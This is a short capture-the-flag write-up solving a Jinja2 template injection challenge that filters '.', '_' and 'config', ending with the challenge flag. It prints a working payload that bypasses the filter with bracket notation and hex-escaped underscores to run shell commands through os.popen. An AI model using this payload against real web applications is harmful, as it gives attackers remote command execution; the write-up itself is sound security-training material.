Seems nothing different as usual, but lets try!

# 『The challenge』
> Solve by: Lylera_

So this challenge is almost same as the version before. But let me try something.

<img width="972" height="430" alt="image" src="https://github.com/user-attachments/assets/9608c71a-f6ae-4096-ae97-0e43fc2006ad" />

Seems nothing different in here. Let me test my payload.

<img width="901" height="444" alt="image" src="https://github.com/user-attachments/assets/05d2f144-6ab5-41d7-b600-6e8a044b1143" />

Ah i see something content filtered in here. But which one? hmm. let me try different payload like `{{config}}`

# 『The issue』

So i try `{{config}}` but here the result:

<img width="876" height="448" alt="image" src="https://github.com/user-attachments/assets/5c8463f4-d915-4678-be15-784707d49746" />

So we found one. Let test the other! (payload: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`

<img width="816" height="450" alt="image" src="https://github.com/user-attachments/assets/ba8e529a-7261-4aca-a9fa-3458c5f23b70" />

Hemm, seems `.` and `_` is getting blacklist. So this is waf ssti. It blacklist `.`, `_`, and `config`. Oke noted

# 『Flag』

So, after finding the issues it getting my conclusion. we can bypass using `[]` and encode to unicode. I found a good website to unicode this one, [here](https://checkserp.com/encode/unicode/)

Try it out. And my command for payload final:
```
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
```

So here the result:

<img width="1051" height="443" alt="image" src="https://github.com/user-attachments/assets/b38711ee-785e-44be-b50f-8763a5a18889" />

After it success, we can use `ls /` and `cat /flag.txt`. here the result

<img width="960" height="446" alt="image" src="https://github.com/user-attachments/assets/9aca379b-78d9-4ecf-90c1-b94417607a88" />

```
Flag: compit{1_gu33ss_u_4r3_w0rthy_en0ugh_g0m3n4s4i}
```
